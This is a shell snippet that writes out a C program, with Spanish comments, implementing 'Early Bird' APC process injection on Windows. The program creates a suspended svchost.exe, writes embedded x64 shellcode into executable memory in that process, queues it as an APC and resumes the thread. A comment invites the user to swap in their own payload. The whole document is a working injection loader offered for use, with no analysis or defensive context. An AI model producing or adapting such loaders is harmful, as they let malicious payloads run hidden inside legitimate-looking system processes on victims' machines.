rm early_bird_injection.c

# Crear el archivo corregido
cat > early_bird_injection.c << 'EOF'
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Shellcode que cargará nuestra DLL (ejemplo - necesitarás generar el tuyo)
unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

DWORD FindTargetProcess(const char* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    DWORD pid = 0;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    
    do {
        if (strcmp(pe.szExeFile, procname) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));
    
    CloseHandle(hSnapshot);
    return pid;
}

BOOL EarlyBirdInjection() {
    HANDLE hProcess, hThread;
    LPVOID pRemoteMemory;
    
    // Crear proceso suspendido - USANDO VERSIÓN ANSI (A) EXPLÍCITAMENTE
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Usar CreateProcessA en lugar de CreateProcessW
    if (!CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",  // Ruta en ANSI
        NULL,                                   // Command line
        NULL,                                   // Process attributes
        NULL,                                   // Thread attributes
        FALSE,                                  // Handle inheritance
        CREATE_SUSPENDED | DETACHED_PROCESS,    // Creation flags
        NULL,                                   // Environment
        NULL,                                   // Current directory
        &si,                                    // Startup info (ANSI)
        &pi)) {                                 // Process info
        printf("Error creando proceso suspendido: %lu\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Proceso suspendido creado. PID: %lu\n", pi.dwProcessId);
    
    // Asignar memoria en el proceso suspendido
    pRemoteMemory = VirtualAllocEx(
        pi.hProcess, 
        NULL, 
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteMemory) {
        printf("Error asignando memoria remota: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    // Escribir shellcode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("Error escribiendo memoria: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    printf("[+] Shellcode escrito en 0x%p\n", pRemoteMemory);
    
    // Colocar APC en el hilo principal - CORREGIDO: pasar 0 como ULONG_PTR
    if (!QueueUserAPC((PAPCFUNC)pRemoteMemory, pi.hThread, (ULONG_PTR)0)) {
        printf("Error encolando APC: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    printf("[+] APC encolado exitosamente\n");
    
    // Reanudar hilo - el APC se ejecutará inmediatamente
    ResumeThread(pi.hThread);
    printf("[+] Hilo reanudado\n");
    
    // Cerrar handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

int main() {
    printf("[+] Iniciando Early Bird Injection...\n");
    
    if (EarlyBirdInjection()) {
        printf("[+] Inyección Early Bird completada!\n");
    } else {
        printf("[-] Falló la inyección\n");
        return 1;
    }
    
    return 0;
}
EOF
